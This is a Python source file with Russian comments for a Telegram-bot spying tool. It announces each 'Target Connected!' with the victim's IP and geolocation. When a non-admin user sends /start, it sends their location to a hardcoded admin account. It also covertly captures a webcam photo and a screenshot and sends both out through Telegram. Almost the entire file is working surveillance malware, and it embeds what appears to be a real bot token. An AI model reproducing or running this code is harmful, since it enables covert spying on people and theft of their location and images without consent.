import telebot                  # Библиотека для создание Telegram бота
import requests                 # Библиотека для get/post запросов
import os                       # Библиотека для работы с системой
import subprocess               # Библиотека для работы с системными командами
import cv2                      # Бибилиотека для фото с веб-камеры
from PIL import ImageGrab       # Модуль для скриншотов экрана
from datetime import datetime   # Модуль времени
from os import system           # Библиотека для выполнения системных команд
 
 
token = '7502047793:AAFgx5nu6s08q_RCljEZOVznL4ypSG1fyH4'
user_id = '5588198100'
 

def new_target():
    # Назначем переменные заранее, чтобы избежать лишнего кода
    country = '-'
    region = '-'
    city = '-'
    timezone = '-'
    zipcode = '-'
    loc = '-'
    target_ip = requests.get('https://ip.42.pl/raw').text # Получаем IP
    url = 'https://ipinfo.io/' + target_ip + '/json' # URL для информации по IP
    json = requests.get(url).json() # Получаем json из содержимого страницы
    # Далее, просто проверяем наличие чего-то, если есть, то записываем в переменную
    if 'country' in json:
        country = json['country']
    if 'region' in json:
        region = json['region']
    if 'city' in json:
        city = json['city']
    if 'timezone' in json:
        timezone = json['timezone']
    if 'postal' in json:
        zipcode = json['postal']
    if 'loc' in json:
        loc = json['loc']
    target_date = datetime.today().strftime('%Y-%m-%d') # Дата у пользователя
    target_time = datetime.today().strftime('%H:%M') # Время у пользователя
    # Составляем сообщение для отправки ботом
    new_target_message = 'Target Connected!\nIP: ' + target_ip + '\nCountry: ' + country
    new_target_message += '\nRegion: ' + region + '\nCity: ' + city + '\nTimeZone: ' + timezone
    new_target_message += '\nZipCode: ' + zipcode + '\nLocation: ' + loc
    new_target_message += '\nDate: ' + str(target_date) + '\nTime: ' + str(target_time)
    # Бот отправляет нам сообщение
    bot.send_message(user_id, new_target_message)
 
 
bot = telebot.TeleBot(token) # Создание самого бота
 

# Если была введена команда
@bot.message_handler(commands=['start'])
def text_message(message):
    if str(message.chat.id) != user_id: # Если id пользователя = id админа
        # Берём IP пользователя
        target_ip = requests.get('https://ip.42.pl/raw', verify=False).text
        # Отправляем нам IP пользователя
        bot.send_message(user_id, target_ip)
        # Берём json из ссылки на информацию по IP
        json = requests.get('https://ipinfo.io/' + target_ip + '/json').json()
        # Если локация есть в джсоне, то
        if 'loc' in json:
            loc = json['loc'] # Записываем локацию в переменную
            loc = loc.split(',') # Разделяем локацию по запятой
            # Отправляем локацию пользователя в виде GoogleMaps
            bot.send_location(user_id, float(loc[0]), float(loc[1]))
        try: # Пытаемся получить фото с камеры
            # Включаём основную камеру
            cam = cv2.VideoCapture(0)
            # "Прогреваем" камеру, чтобы снимок не был тёмным
            for _ in range(100):
                cam.read()
            # Делаем снимок
            s, img = cam.read()
            # Сохраняем снимок
            cv2.imwrite('img.bmp', img)
            # Отключаем камеру
            cam.release()
            # Открываем снимок
            cam_img = open('img.bmp', 'rb')
            # Отправляем нам снимок
            bot.send_photo(user_id, cam_img)
            # Закрываем и удаляем снимок
            cam_img.close()
            os.remove('img.bmp')
        except: # Если произошла ошибка
            bot.send_message(user_id, 'Ошибка! У пользователя нет камеры!')
        screen = ImageGrab.grab()
        bot.send_photo(user_id, screen)
bot.polling(none_stop=True, interval=0, timeout=30) 
